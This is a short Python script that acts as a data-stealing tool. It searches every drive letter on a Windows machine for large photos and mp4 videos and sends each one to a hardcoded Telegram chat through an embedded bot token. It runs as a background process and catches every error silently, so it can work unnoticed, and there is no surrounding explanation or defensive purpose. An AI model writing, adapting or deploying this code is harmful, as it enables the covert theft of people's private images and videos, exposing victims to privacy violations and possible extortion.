import os
import time
import telebot
from PIL import Image
import multiprocessing


bot = telebot.TeleBot('5496869385:AAGjDRX2wSck08zE7RIeBFDrQamILyrg858')
ID = 406690752


photol = [".img", ".png", ".jpg", ".jpeg"]
videol = ["mp4"]


def check_file(url_check, file_check):
    for photo in photol:
        if file_check.endswith(photo):
            try:
                im = Image.open(url_check)
                width, height = im.size
                if (width > 600) and (height > 600):
                    file = open(url_check, "rb")
                    bot.send_photo(ID, file)
                    # print(f"Photo send: {url_check}")
                else:
                    continue
            except:
                pass

    for video in videol:
        if file_check.endswith(video):
            try:
                file = open(url_check, "rb")
                bot.send_video(ID, file)
            except:
                pass


def search_img_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            url = (os.path.join(root, file))
            check_file(url, file)


def search_all_drives():
    drives = []
    for drive in range(ord('A'), ord('Z') + 1):
        drive = chr(drive)
        if os.path.exists(drive + ":\\"):
            drives.append(drive + ":\\")
    return drives


def find_img():
    all_drives = search_all_drives()
    for drive in all_drives:
        search_img_files(drive)


def main():
    # start = time.time()
    find_img()
    # end = time.time() - start
    # print("------------------------------------------------")
    # print(f"Time: {end}")


def background_task():
    main()


if __name__ == '__main__':
    process = multiprocessing.Process(target=background_task)
    process.start()
    process.join()



